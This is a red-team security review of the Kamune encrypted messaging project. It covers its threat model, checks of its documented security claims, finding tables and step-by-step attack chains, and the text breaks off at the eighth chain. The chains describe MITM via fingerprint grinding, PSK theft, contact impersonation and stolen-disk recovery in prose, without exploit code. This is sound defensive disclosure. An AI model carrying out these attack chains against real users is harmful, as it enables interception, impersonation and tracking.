# Kamune red-team review

- Date: 2026-10-03
- Commit: `36b6e1c` on `main`
- Scope: all five Go modules (root `kamune`, `cmd/relay`, `cmd/daemon`, `cmd/bus`, `cmd/tui`), the bus Svelte frontend, build and packaging scripts, and the documentation in `README.md`, `AGENTS.md`, `docs/` and the module READMEs.

## Contents

1. [Summary](#summary)
2. [Scope and method](#scope-and-method)
3. [Project overview and threat model](#project-overview-and-threat-model)
4. [Documented security claims checked against the code](#documented-security-claims-checked-against-the-code)
5. [Findings overview](#findings-overview)
6. [Red-team assessment](#red-team-assessment)
7. [Findings by module](#findings-by-module)
8. [Appendix: rejected claim](#appendix-rejected-claim)

## Summary

Kamune is an experimental library and set of clients for two-party, end-to-end encrypted messaging over untrusted networks. Sessions use Ed25519 identities, an ML-KEM-768 handshake inside an ephemeral HPKE tunnel, and XChaCha20-Poly1305 frames with strict sequence numbers. Clients connect over TCP, KCP/UDP, a blind relay, or a UDP hole punch set up by a broker.

The review produced 218 findings after merging duplicates: 0 critical, 5 high, 60 medium, 113 low and 40 info. Every finding in this report was checked by at least one verifier whose job was to refute it, and all 218 were confirmed. One further claim was refuted and is listed in the appendix.

No finding lets a network attacker, the relay operator or a third party decrypt or forge messages between two peers whose keys match what they verified. Per-direction session keys, signature checks against the bound key, strict sequencing and phase-specific route checks held up under targeted testing (see [Controls that held up](#controls-that-held-up)). The problems sit around that core: what the pre-session handshake reveals, how users verify keys, what the clients store, and how the relay and broker treat unauthenticated traffic.

The five high-severity findings:

| ID                | Finding                                                                                                                                                                                                                                  |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [BUS-01](#bus-01) | In Quick mode, the default in bus and daemon, any stored contact's key is accepted for any connection, and the session is labelled with the name the remote claims. A contact the user accepted once can appear as another contact.      |
| [STO-01](#sto-01) | The database passphrase goes through one HKDF-SHA512 call. A sandbox test measured about 14 µs per guess per core against a stolen database, and the identity key is behind that passphrase.                                             |
| [RC-01](#rc-01)   | Relay WebSocket clients keep the library's 32 KiB default read limit. Kamune pads frames to 32 KiB and 64 KiB buckets, so those frames close the receiving peer's relay connection. Over ws, messages were lost while Send returned nil. |
| [RC-02](#rc-02)   | A frame padded to the top bucket is 65,535 bytes. Relay wrapping adds 24 bytes, so the frame cannot cross any relay transport and the session dies.                                                                                      |
| [REL-01](#rel-01) | On Windows builds, one UDP datagram over 1,500 bytes sent to the broker port makes the read return `WSAEMSGSIZE`. The broker treats that as fatal, and the whole relay process exits.                                                    |

Recurring themes in the medium findings:

- **What the relay sees.** The HPKE exchange is unauthenticated and nothing later binds it. A relay or on-path attacker can terminate it on both sides and read both identities, the session ID and resumption tokens, contrary to RELAY.md ([KAM-02](#kam-02)). The same gap exposes the relay PSK to an active attacker ([RC-03](#rc-03)).
- **Key verification.** The 8-emoji fingerprint users are told to compare carries 52.7 bits ([KAM-03](#kam-03)). Verifier prompts wait 2 minutes inside a 30 s handshake deadline, and a late Accept still stores the key as trusted ([KAM-07](#kam-07)). Strict mode does not prompt for resumed sessions ([KAM-08](#kam-08)). The bus replaces the open verification dialog with each new request ([BUS-15](#bus-15)).
- **Incognito.** Incognito sessions still leave a session record with the peer key and 20 resumption tokens, and the session appears in History ([KAM-04](#kam-04)).
- **Static tokens.** Static relay and P2P tokens are the SHA-256 of the two public keys. Anyone who knows both keys can squat relay sessions or take the broker match and learn the listener's IP:port ([RC-04](#rc-04)). The legitimate static P2P path never matches because of a 32-byte vs 16-byte comparison ([RC-07](#rc-07)).
- **Relay abuse resistance.** Clients can choose their rate-limit key through header precedence ([REL-11](#rel-11)). Behind a CDN all clients share one bucket ([REL-05](#rel-05)). Spoofed UDP to the broker can lock a victim IP out of every relay transport ([REL-07](#rel-07)).
- **Terminal and UI content.** The TUI writes peer text and names to the terminal unfiltered, so OSC 52 clipboard writes, OSC 8 links and title changes reach the user's terminal ([TUI-01](#tui-01), [TUI-07](#tui-07)).

Tool results at this commit:

- `go vet` is clean in every module.
- `go test -race` passes in every module, including bus (run with Wails cgo tags patched in a sandbox).
- The six fuzz targets in the Makefile ran 60 s each with no crashers.
- `govulncheck` reports 4 `golang.org/x/crypto` advisories, none reachable ([KAM-29](#kam-29)).
- `npm audit` reports `devalue <=5.9.2` through the svelte devDependency, which is not in the shipped bundle ([BUS-48](#bus-48)).

## Scope and method

The review covered 22,599 lines of non-test Go (generated protobuf excluded), 13,308 lines of Go tests, 9,087 lines of Svelte and TypeScript, and 6,708 lines of documentation.

1. **Brief.** One reviewer read the documentation and core code. It wrote down the project's purpose, trust boundaries, eight adversary profiles and the security claims made in the docs. Every later reviewer worked from that brief.
2. **Independent review.** 22 reviewers worked in parallel, each with one lens:
   - core cryptographic protocol, transport and framing, resumption and lifecycle, supporting crypto packages with spec conformance
   - storage at-rest protection, storage correctness
   - relay client, broker client
   - relay network surface, relay sessions and broker server
   - daemon command interface, daemon networking, daemon vs bus code divergence
   - bus backend, bus frontend and packaging
   - TUI
   - root-module tooling, sub-module tooling
   - documentation accuracy
   - three attacker simulations: malicious relay or network, malicious peer, local attacker

   They produced 365 raw findings.

3. **Merge and gap pass.** One agent per module merged findings with the same root cause. A second agent per module then re-read the module looking only for issues not yet reported, and added 53.
4. **Verification.** Critical and high claims each went to two independent verifiers. One traced the code path and tried to refute the claim. The other tried to reproduce it with a test in a sandbox copy of the repository. When the two disagreed, a third verifier decided. Medium, low and info claims went to verifiers in groups of four, again with instructions to refute. One claim was refuted. Verifiers changed the severity of 19 findings: 7 high to medium, 4 medium to low, 5 low to info and 3 info to low.
5. **Final merge.** Same-root-cause findings that had been filed under different modules were merged by hand (254 to 218). Where one defect shows up in several modules, the finding sits in the module that needs the fix and lists the others under "Also affects".

All execution happened in copies of the repository outside the working tree. The repository was not modified.

Severity scale:

| Severity | Meaning in this report                                                                                                                                                                                                        |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Critical | Remote break of session confidentiality, peer authentication or message integrity, key or plaintext disclosure, or remote code execution, by an attacker the project claims to defend against, with no unusual preconditions. |
| High     | Remote crash or DoS from unauthenticated input with low effort; a security property broken under realistic conditions; verification bypass; at-rest secrets recoverable from a stolen disk; data loss.                        |
| Medium   | Bugs that need specific timing or configuration; races that corrupt state; resource leaks; privacy leaks beyond what the docs state; false security claims in docs with limited direct impact.                                |
| Low      | Hardening gaps, minor correctness bugs, misleading errors, edge cases with small impact.                                                                                                                                      |
| Info     | Documentation drift without security impact, test gaps, code quality.                                                                                                                                                         |

Finding IDs use a module prefix: `KAM` (core library), `STO` (storage), `RC` (relayconn), `REL` (relay), `DMN` (daemon), `BUS` (bus), `TUI` (tui), `DOC` (docs). Within a module, findings are ordered by severity and then by category. Evidence blocks hold the quoted code and test output from review and verification; high findings include both, medium findings include the reviewer's excerpt.

## Project overview and threat model

### Session establishment

1. **Exchange.** Both sides run ephemeral HPKE (MLKEM768-X25519, HKDF-SHA512, ChaCha20-Poly1305) with an empty info string (`pkg/exchange/channel.go:106,162`). No long-term key takes part.
2. **Introduction.** The initiator sends `Introduce{Name, PublicKey, AppVersion}`, signed with its own key (`intro.go:61-94`). The responder checks the version and runs the application's `RemoteVerifier`, then sends its own Introduce, which the dialer checks the same way.
3. **Handshake.** ML-KEM-768 runs inside the HPKE tunnel with identity-signed messages. The session ID is a 12-character initiator prefix plus a 12-character responder suffix. HKDF-SHA512 derives one key per direction (`handshake.go`).
4. **Challenge.** This is the first use of the session AEAD. Each side echoes the other's challenge.
5. **Communication.** Each frame is a `SignedTransport{Data, Signature, Metadata, Padding}`. It is encrypted with XChaCha20-Poly1305 using a random nonce and sent with a strict sequence number; any gap is fatal (`transport.go:81-140`).
6. **Resumption.** A `ResumeRequest{SessionID, Token}`, signed by the initiator, replaces Introduction. It does not call the verifier. Each session has 20 single-use tokens valid for 24 hours. The Handshake and Challenge still run.

Transports:

- **Direct.** TCP and KCP (`server.go:404`, `dial.go:268`).
- **Relay.** The client runs HPKE with the relay, sends an optional PSK and a `Register{mode, token}`, and tunnels kamune frames inside relay frames. Clients may add TLS or WSS.
- **P2P.** The broker answers STUN-like echo and REGISTER packets over UDP. When two registrations carry the same token, it sends each side the other's address, and the peers hole-punch and run KCP.

Storage is a BoltDB file under `~/.config/kamune/`. Values are encrypted with a data key wrapped by a passphrase-derived key; bucket and key names are plaintext. Bus and daemon can cache the passphrase in the OS keychain.

### Assets and where they live

| Asset                                                               | Holder                                                     |
| ------------------------------------------------------------------- | ---------------------------------------------------------- |
| Ed25519 identity private key                                        | Local DB under the data key; process memory                |
| ML-KEM secret, session keys, resumption root                        | Process memory only                                        |
| Resumption tokens, session establishment time, peer key per session | Local DB                                                   |
| Relay reconnect tokens, P2P and relay token lists                   | Client memory and DB                                       |
| Message plaintext and history                                       | Endpoint memory; DB unless incognito                       |
| DB passphrase                                                       | `KAMUNE_DB_PASSPHRASE`, OS keychain, bus and daemon memory |
| Peer list (names, keys, first and last seen)                        | Local DB                                                   |
| Relay PSK                                                           | Relay config; sent by clients to the relay inside HPKE     |
| IP addresses, timing, sizes, token pairing                          | Relay, broker, network; client logs                        |

### Adversary profiles

| ID  | Adversary                                   | What the docs say it cannot do                                                                                           |
| --- | ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| A1  | Passive network observer                    | Read content; padding buckets resist size analysis (SPEC 12.7, RELAY.md Threat Model).                                   |
| A2  | Active on-path attacker                     | Read or forge messages; signatures, AEAD and the challenge stop MITM (SPEC 8.4, 12.3).                                   |
| A3  | Malicious relay or broker operator          | Read content, impersonate a peer, or see public keys and identities (RELAY.md Design Goals).                             |
| A4  | Malicious authenticated peer                | No explicit claim; frame size caps and fatal sequence gaps apply (SPEC 5.2, 13).                                         |
| A5  | Unauthenticated remote client               | Exhaust the relay: per-IP rate limit before HPKE, handshake timeout, session cap (RELAY.md Rate Limiting, Known Limits). |
| A6  | Stolen-disk attacker                        | Read the database without the passphrase (SPEC 11.2).                                                                    |
| A7  | Other local user or malicious local process | No explicit claim beyond database encryption.                                                                            |
| A8  | Hostile content rendered in the UIs         | No explicit claim.                                                                                                       |

## Documented security claims checked against the code

| #   | Claim (source)                                                                                                    | Result                                                                                                                                                                                                                    |
| --- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Only the two participants can decrypt (SPEC 12.1)                                                                 | Holds for verified peers. A first-contact MITM needs a key that matches the victim's 8-emoji fingerprint, about 2^52.7 work per target ([KAM-03](#kam-03)).                                                               |
| 2   | Both peers are authenticated in the Introduction phase (SPEC 12.3)                                                | Partly. Introduce is self-signed and replayable across connections; proof of key possession comes only at the Challenge, after the verifier has run ([KAM-01](#kam-01)).                                                  |
| 3   | The relay never sees public keys or identities (RELAY.md Design Goals)                                            | False. A relay can terminate the unauthenticated HPKE on both legs and read both Introduce messages ([KAM-02](#kam-02)).                                                                                                  |
| 4   | A malicious relay cannot impersonate a peer (RELAY.md)                                                            | Holds for message forgery. A known contact can still be shown under another contact's name in Quick mode ([BUS-01](#bus-01)).                                                                                             |
| 5   | In PSK mode the password is protected inside HPKE (RELAY.md Authentication Modes)                                 | Only against passive observers ([RC-03](#rc-03)).                                                                                                                                                                         |
| 6   | Forward secrecy per session (SPEC 12.4)                                                                           | Holds for message keys. Resumption tokens on disk allow resumption within 24 hours, as RFC001 acknowledges; tokens survive a close that never reached the peer ([KAM-17](#kam-17), [TUI-19](#tui-19)).                    |
| 7   | Replay, duplication and reordering are rejected (SPEC 8.2, 12.6)                                                  | Holds for session frames (`transport.go:107-127`). Introduce, ResumeRequest and ResumeAccept replay across connections ([KAM-01](#kam-01)).                                                                               |
| 8   | Signatures cover metadata with domain separation (SPEC 8.1, RFC002)                                               | Holds for session frames (`serde.go:83-102`).                                                                                                                                                                             |
| 9   | The transcript hash prevents replay and downgrade (SPEC 6.4, 7.3)                                                 | The receiver never recomputes the challenge, so the binding is not checked. No exploit today, because every transcript field also feeds key derivation ([KAM-27](#kam-27)).                                               |
| 10  | Resumption tokens are single-use and consumed only after authentication (SPEC 6.8)                                | Holds (`server.go:267-285`, `pkg/storage/session.go:262-293`).                                                                                                                                                            |
| 11  | Tokens are invalidated on explicit close (SPEC 6.6)                                                               | Only when the close frame is sent ([KAM-17](#kam-17), [TUI-19](#tui-19)).                                                                                                                                                 |
| 12  | Database encryption protects identity, peers, sessions and history (SPEC 11.2)                                    | Values are encrypted. The KDF is HKDF only ([STO-01](#sto-01)), names and timestamps are plaintext ([STO-05](#sto-05)), and ciphertexts are not bound to their location ([STO-03](#sto-03)).                              |
| 13  | Peers expire 7 days after first contact (SPEC 11.4)                                                               | Implemented (`pkg/storage/peer.go:65`). LastSeen is never updated ([STO-10](#sto-10)).                                                                                                                                    |
| 14  | The relay rate-limits before HPKE and trusts forwarded headers only from trusted proxies (RELAY.md Rate Limiting) | The limiter runs before HPKE. Header precedence lets clients pick their key ([REL-11](#rel-11)), CDN deployments share one bucket ([REL-05](#rel-05)), and WSS TLS handshakes run before the limiter ([REL-17](#rel-17)). |
| 15  | Relay tokens are single-use, 128-bit and TTL-bound (RELAY.md Token Lifecycle)                                     | Holds for random tokens (`cmd/relay/internal/services/session.go:61`). Static tokens are derivable from public keys ([RC-04](#rc-04)).                                                                                    |
| 16  | ECDH reconnect tokens cannot be computed from public keys (RELAY.md)                                              | The derivation holds. The pool is never consumed or expired, so token[0] is re-registered indefinitely ([DMN-09](#dmn-09), [BUS-16](#bus-16)).                                                                            |
| 17  | Broker AEAD prevents NOTIFY forgery (RELAY.md Replay Considerations)                                              | No origin authentication: anyone who knows the client's X25519 public key can forge or replay a match ([RC-05](#rc-05)).                                                                                                  |
| 18  | KCP provides Reed-Solomon FEC (SPEC 9.2)                                                                          | Not configured; every call site passes 0 data and 0 parity shards ([DOC-05](#doc-05)), and KCP packets are unauthenticated ([KAM-11](#kam-11)).                                                                           |
| 19  | Strict verification prompts for every connection (bus README, DAEMON.md)                                          | Not for resumed sessions ([KAM-08](#kam-08)). In bus, an unknown mode value falls through to Auto-Accept ([BUS-38](#bus-38)).                                                                                             |
| 20  | Incognito mode does not record sessions (DAEMON.md Incognito Mode)                                                | False ([KAM-04](#kam-04)).                                                                                                                                                                                                |
| 21  | Bucketed padding hides message length (SPEC 12.7)                                                                 | Mostly. Some frames land one or two bytes under a bucket boundary and reveal the exact size ([KAM-09](#kam-09)).                                                                                                          |

## Findings overview

| Module                         | Critical | High | Medium | Low | Info | Total |
| ------------------------------ | -------: | ---: | -----: | --: | ---: | ----: |
| [kamune](#kamune-core-library) |        0 |    0 |      8 |  16 |    8 |    32 |
| [storage](#kamune-storage)     |        0 |    1 |      4 |   8 |    1 |    14 |
| [relayconn](#relayconn)        |        0 |    2 |      6 |   9 |    3 |    20 |
| [relay](#relay)                |        0 |    1 |     10 |  12 |    2 |    25 |
| [daemon](#daemon)              |        0 |    0 |      9 |  27 |    3 |    39 |
| [bus](#bus)                    |        0 |    1 |     15 |  27 |    6 |    49 |
| [tui](#tui)                    |        0 |    0 |      7 |  12 |    3 |    22 |
| [docs](#docs)                  |        0 |    0 |      1 |   2 |   14 |    17 |
| **Total**                      |        0 |    5 |     60 | 113 |   40 |   218 |

A finding that affects several modules is filed under the module that needs the fix. The other modules list it below their own table.

## Red-team assessment

This section maps the verified findings onto the adversary profiles, shows where they combine, and lists the controls that held up.

### Attacker capabilities against the current code

| Profile                             | What the attacker can achieve                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Enabling findings                                                                                                                                                                                                                                                                                                               |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A1, passive network observer        | Cannot read message content. Each direction uses its own XChaCha20-Poly1305 key (handshake.go:110-121, handshake.go:228-239) with a random 24-byte nonce (internal/enigma/enigma.go:44-52). The observer can narrow message length because padding emits sizes one or two bytes under a bucket ([KAM-09](#kam-09)). It can fingerprint relays through the "Kamune Relay" certificate CN on TLS 1.2 ([REL-03](#rel-03)) and through cleartext WebSocket upgrades to `/ws` from scheme-less or TUI relay addresses ([DMN-10](#dmn-10), [TUI-08](#tui-08)). It can link random P2P tokens to one device through the reused broker X25519 key ([DMN-12](#dmn-12)).                                                                                                                                                                                                                                                                                                                                                                                                     | [KAM-09](#kam-09), [REL-03](#rel-03), [DMN-10](#dmn-10), [TUI-08](#tui-08), [DMN-12](#dmn-12)                                                                                                                                                                                                                                   |
| A2, active on-path attacker         | Can terminate the unauthenticated HPKE Exchange and read both Introduce messages, the session ID and ResumeRequest tokens ([KAM-02](#kam-02)). It cannot read session messages: the ML-KEM key is signed and checked against the Introduce key (serde.go:91-95), and challenge frames run inside the session AEAD. On ws, tcp, or TLS with `?insecure=true`, it captures the relay PSK and Register token ([RC-03](#rc-03), [REL-02](#rel-02)). Imported share URLs can set `insecure=true` silently ([BUS-36](#bus-36)). With a spoofed broker source it can forge PEER_MATCHED ([RC-05](#rc-05)) and reset KCP sessions with one spoofed header ([KAM-11](#kam-11)). By delaying segments or dropping one frame it can tear down sessions ([KAM-13](#kam-13)) or desync resumption tokens ([KAM-15](#kam-15)). If it grinds an 8-emoji second preimage ([KAM-03](#kam-03)), a first-contact MITM passes the documented emoji check and it reads all content.                                                                                                     | [KAM-02](#kam-02), [RC-03](#rc-03), [REL-02](#rel-02), [BUS-36](#bus-36), [RC-05](#rc-05), [KAM-11](#kam-11), [KAM-13](#kam-13), [KAM-15](#kam-15), [KAM-03](#kam-03), [DMN-10](#dmn-10), [TUI-08](#tui-08)                                                                                                                     |
| A3, malicious relay or broker       | Sees both Ed25519 keys and names for every paired session by running HPKE on both sides ([KAM-02](#kam-02)), contrary to RELAY.md. Can exhaust client memory through the unbounded RelayConn buffer ([RC-06](#rc-06)). Can freeze the daemon command loop ([DMN-04](#dmn-04)), the TUI ([TUI-10](#tui-10)) and daemon dials ([DMN-15](#dmn-15)) by stalling. Can drop one frame to force a cold reconnect and a new verification prompt ([KAM-15](#kam-15)). Can return a different token in Registered ([RC-17](#rc-17)). Can link users through token[0] re-registration after close ([BUS-16](#bus-16), [DMN-09](#dmn-09)) and through the stable broker key ([DMN-12](#dmn-12)). An honest operator's default log already records IP pairs and roles ([REL-04](#rel-04)). Cannot read or forge messages, for the same reasons as A2.                                                                                                                                                                                                                           | [KAM-02](#kam-02), [RC-06](#rc-06), [DMN-04](#dmn-04), [DMN-15](#dmn-15), [TUI-10](#tui-10), [KAM-15](#kam-15), [RC-17](#rc-17), [BUS-16](#bus-16), [DMN-09](#dmn-09), [DMN-12](#dmn-12), [REL-04](#rel-04)                                                                                                                     |
| A4, malicious authenticated peer    | Once accepted, can reconnect in Quick mode under any claimed name and be shown as another contact ([BUS-01](#bus-01)). Can write OSC 52 clipboard, OSC 8 link and title escapes into the TUI ([TUI-01](#tui-01)). Can reorder the stored transcript with signed timestamps ([STO-02](#sto-02)). Can grow memory, disk and notifications without bound ([BUS-04](#bus-04), [DMN-02](#dmn-02), [TUI-09](#tui-09), [KAM-20](#kam-20), [DMN-13](#dmn-13)). Can steal input focus so the user's next message goes to it ([BUS-14](#bus-14)). Can re-create a deleted session bucket by sending close ([KAM-16](#kam-16)). A small-order identity key makes one signature valid for every message, so any third party can then act as that stored peer ([KAM-23](#kam-23)).                                                                                                                                                                                                                                                                                              | [BUS-01](#bus-01), [TUI-01](#tui-01), [STO-02](#sto-02), [BUS-04](#bus-04), [DMN-02](#dmn-02), [TUI-09](#tui-09), [KAM-20](#kam-20), [DMN-13](#dmn-13), [BUS-14](#bus-14), [KAM-16](#kam-16), [KAM-23](#kam-23)                                                                                                                 |
| A5, unauthenticated remote client   | Against core servers: spins the accept loop at file-descriptor exhaustion ([KAM-05](#kam-05), server.go:93-103 has no backoff), pins one goroutine and socket per attempt on a TUI server ([TUI-02](#tui-02)), floods or swaps verification prompts ([BUS-15](#bus-15), [DMN-03](#dmn-03)), injects text into names, logs and the TUI verify screen ([BUS-37](#bus-37), [TUI-07](#tui-07), [KAM-22](#kam-22)), and confirms which identity runs at an IP from the signed resume rejection ([KAM-10](#kam-10)). Against the relay: crashes Windows builds with one 1501-byte UDP datagram ([REL-01](#rel-01)), locks out a victim IP with spoofed broker packets ([REL-07](#rel-07)), bypasses or collapses the rate limiter ([REL-05](#rel-05), [REL-11](#rel-11), [REL-08](#rel-08)), holds idle HTTP sockets forever ([REL-09](#rel-09)), fills the broker registry ([REL-06](#rel-06)) and drives memory use through the limiter ([REL-10](#rel-10)). With two public keys it squats static relay tokens and learns a P2P listener's IP:port ([RC-04](#rc-04)). | [KAM-05](#kam-05), [TUI-02](#tui-02), [BUS-15](#bus-15), [DMN-03](#dmn-03), [BUS-37](#bus-37), [TUI-07](#tui-07), [KAM-22](#kam-22), [KAM-10](#kam-10), [REL-01](#rel-01), [REL-05](#rel-05), [REL-06](#rel-06), [REL-07](#rel-07), [REL-11](#rel-11), [REL-08](#rel-08), [REL-10](#rel-10), [RC-04](#rc-04), [REL-09](#rel-09) |
| A6, stolen-disk attacker            | Reads plaintext timestamps, direction, lengths, session IDs and peer-key hashes with no passphrase ([STO-05](#sto-05)). Guesses passphrases at about 14 us per guess per core because the KDF is HKDF only ([STO-01](#sto-01)). Several UI paths create a DB with an empty passphrase, which needs no guessing ([BUS-12](#bus-12), [BUS-02](#bus-02), [DMN-34](#dmn-34), [TUI-17](#tui-17)). With the DEK it recovers deleted history from free pages ([STO-04](#sto-04)), incognito session records and peer keys ([KAM-04](#kam-04)), and resumption tokens left after a failed close ([KAM-17](#kam-17), [TUI-19](#tui-19)).                                                                                                                                                                                                                                                                                                                                                                                                                                    | [STO-01](#sto-01), [STO-05](#sto-05), [STO-04](#sto-04), [BUS-12](#bus-12), [BUS-02](#bus-02), [DMN-34](#dmn-34), [TUI-17](#tui-17), [KAM-04](#kam-04), [KAM-17](#kam-17), [TUI-19](#tui-19)                                                                                                                                    |
| A7, other local user or process     | Reads the DB passphrase from the OS keychain, where the daemon writes it on every open without opt-in ([DMN-01](#dmn-01)). Reads full relay and P2P tokens from exported logs created with umask-default mode ([BUS-21](#bus-21), [DMN-11](#dmn-11)). Reads message previews from notification and clipboard history, including incognito ([BUS-20](#bus-20)). With write access and no passphrase, copies a peer record to make an attacker key a known peer ([STO-03](#sto-03)), or deletes one metadata key so the next start re-keys the DB and destroys all data ([STO-09](#sto-09)). The DB directory is 0740 and existing file modes are never checked ([STO-06](#sto-06)).                                                                                                                                                                                                                                                                                                                                                                                 | [DMN-01](#dmn-01), [BUS-21](#bus-21), [DMN-11](#dmn-11), [BUS-20](#bus-20), [STO-03](#sto-03), [STO-09](#sto-09), [STO-06](#sto-06)                                                                                                                                                                                             |
| A8, hostile content rendered in UIs | In the TUI, peer text and names reach the terminal raw ([TUI-01](#tui-01), [TUI-07](#tui-07)), so a name can print a forged fingerprint block and a message can set the clipboard. In bus, peer names are unbounded and unsanitized in status, logs and the verify dialog, so logs can be forged and a long name hides Accept ([BUS-37](#bus-37), [KAM-22](#kam-22)). Bus webview script injection was not found: a grep of cmd/bus/frontend/src finds no `{@html}`, `innerHTML`, `outerHTML` or `insertAdjacentHTML`, and Svelte text interpolation escapes. There is no CSP as a second layer ([BUS-18](#bus-18)).                                                                                                                                                                                                                                                                                                                                                                                                                                               | [TUI-01](#tui-01), [TUI-07](#tui-07), [BUS-37](#bus-37), [KAM-22](#kam-22), [BUS-18](#bus-18)                                                                                                                                                                                                                                   |

### Attack chains

**Chain 1: Relay-assisted first-contact MITM that passes the emoji check**

- Profile: A3, or A2 on a ws, tcp or insecure TLS relay path.
- Preconditions: The attacker can observe one earlier connection, or holds both share cards. The targets have not connected before, or one side uses Strict mode with an unknown key.
- Steps:
  1. Terminate HPKE on both legs and log both Ed25519 keys from the Introduce messages ([KAM-02](#kam-02)).
  2. Offline, grind keys A' and B' whose 8-emoji fingerprints match Alice and Bob. Each target is about 2^52.7 trials ([KAM-03](#kam-03)). The hex field in the dialog starts with the same 12-byte PKIX header for every Ed25519 key, so a glance at its start does not separate keys.
  3. On the next first contact, run a separate handshake with each side using A' and B'. The handshake is valid on each leg because each side verifies the key it was introduced to (intro.go:80-85).
  4. Users compare emoji, which match. The 30 s handshake deadline against a 2-minute prompt pushes users to accept fast or fail ([KAM-07](#kam-07)).
- Outcome: The attacker reads and modifies every message in both sessions. In Quick mode both forged keys are stored as known and are auto-accepted later ([BUS-01](#bus-01)).

**Chain 2: PSK and token capture on the relay leg**

- Profile: A2 on public Wi-Fi or an ISP.
- Preconditions: The relay uses the default in-memory certificate, or the client address has no scheme or is used by the TUI.
- Steps:
  1. The default certificate is regenerated per process and cannot be pinned, so users add `?insecure=true` ([REL-02](#rel-02), [RC-03](#rc-03)). An altered share card can add it with no visible change ([BUS-36](#bus-36)). A scheme-less address defaults to plain ws ([DMN-10](#dmn-10)). The TUI has no TLS option ([TUI-08](#tui-08)).
  2. Intercept the connection and run HPKE with the client and with the relay. Read `Frame.Auth{psk}` and `Register{mode, token}` ([RC-03](#rc-03)).
  3. Join the observed token first, which burns the single-use slot and blocks the intended peer, or keep using the private relay with the PSK.
  4. The same position also yields both identities and the session ID from Chain 1 step 1 ([KAM-02](#kam-02)).
- Outcome: Loss of the deployment password, denial of the victim's rendezvous, and identity metadata. Message content stays protected.

**Chain 3: Known contact impersonates another contact**

- Profile: A4 (Mallory, accepted once by Alice).
- Preconditions: Alice uses Quick mode, the bus default. Mallory knows Alice's and Bob's public keys.
- Steps:
  1. Compute the static token `SHA256(min||max)` from the two keys ([RC-04](#rc-04)).
  2. Register MODE_CREATE on the relay before Bob so Bob gets `ErrTokenInUse`, or join Alice's static listener ([RC-04](#rc-04)).
  3. Send Introduce with Name = "Bob". Quick mode finds Mallory's stored key and accepts with no prompt, and the UI labels the session with the claimed name ([BUS-01](#bus-01)).
  4. The new session takes focus, so text Alice was typing goes to it on Enter ([BUS-14](#bus-14)).
- Outcome: Alice sends Bob-intended content to Mallory. The only signal is the fingerprint in the peer info dialog.

**Chain 4: Unauthenticated prompt swap to permanent trust**

- Profile: A5 who can reach the server port, or who holds any relay or P2P token.
- Preconditions: The victim is verifying a real "Alice" request in bus or a daemon-based UI.
- Steps:
  1. Open handshakes in a loop with fresh keys and Name = "Alice". Each request replaces the single bus dialog ([BUS-15](#bus-15)). The daemon has no cap or dedupe on prompts ([DMN-03](#dmn-03)).
  2. In the TUI, a crafted Name prints a copy of Alice's real fingerprint block on the verify screen ([TUI-07](#tui-07)).
  3. The user accepts the swapped prompt. If the accept lands after the 30 s deadline, the key is still stored as trusted although the handshake failed ([KAM-07](#kam-07)).
  4. In Quick mode the attacker key is now known and reconnects with no prompt under any name ([BUS-01](#bus-01)).
- Outcome: An unauthenticated attacker becomes a trusted contact. Chain 3 then applies.

**Chain 5: Static-token location tracking and session reset**

- Profile: A5 who knows two users' public keys, or A4.
- Preconditions: One user runs a P2P listener for the other with a static token.
- Steps:
  1. Send broker REGISTER with the computed token every few seconds. Each match returns NOTIFY with the listener's public IP:port and X25519 key ([RC-04](#rc-04)).
  2. Removing the token in the UI does not stop the listener re-registering it every 30 s ([BUS-03](#bus-03), [DMN-07](#dmn-07)).
  3. With source spoofing, send a 24-byte KCP header to the peer's port with src set to the listener's address to close the live session ([KAM-11](#kam-11)). A replayed REGISTER redirects the other peer's hole-punch to an attacker address ([REL-12](#rel-12)).
- Outcome: Ongoing tracking of the user's IP history and repeated session resets. The legitimate static P2P path does not work at all ([RC-07](#rc-07)), while the broker still sends the attacker NOTIFY.

**Chain 6: Exported log to rendezvous after explicit close**

- Profile: A7.
- Preconditions: The user exported logs to a shared location, or another user can read stderr capture.
- Steps:
  1. Read a full relay or P2P token from the 0644 export ([BUS-21](#bus-21), [DMN-11](#dmn-11)).
  2. The listener keeps re-registering token[0] after the session is closed ([BUS-16](#bus-16), [DMN-09](#dmn-09)), so the token stays usable.
  3. Join the token. In Auto-Accept, reached by one Ctrl+2 ([BUS-13](#bus-13)), by an out-of-range mode value ([BUS-38](#bus-38)), or by settings carried over from another DB in the daemon ([DMN-26](#dmn-26)), the attacker gets a session and is stored as known ([DMN-36](#dmn-36)).
- Outcome: A local user obtains a session with the victim or blocks the intended peer.

**Chain 7: Seized laptop yields identity, deleted history and incognito contacts**

- Profile: A6.
- Preconditions: Device seizure.
- Steps:
  1. If the DB was created with an empty passphrase ([BUS-12](#bus-12), [BUS-02](#bus-02), [DMN-34](#dmn-34), [TUI-17](#tui-17)), derive the KEK from the empty string. Otherwise guess at about 14 us per guess per core ([STO-01](#sto-01)). [DMN-01](#dmn-01) places the passphrase in the keychain.
  2. Without the passphrase, read message timing, direction, length and peer-key hashes in plaintext ([STO-05](#sto-05)).
  3. With the DEK, recover deleted conversations from free pages ([STO-04](#sto-04)) and incognito session records with the contact's key ([KAM-04](#kam-04)).
  4. Resumption tokens left by a close that never reached the peer ([KAM-17](#kam-17), [TUI-19](#tui-19)) let the holder resume within the 24 h window (kamune.go:54). Strict mode does not prompt on resume ([KAM-08](#kam-08)).
- Outcome: Identity key, contact graph including incognito contacts, deleted history, and a live resumed session as the user inside the window.

**Chain 8: Relay lockout from spoofed UDP**

- Profile: A5 on a network without egress source filtering.
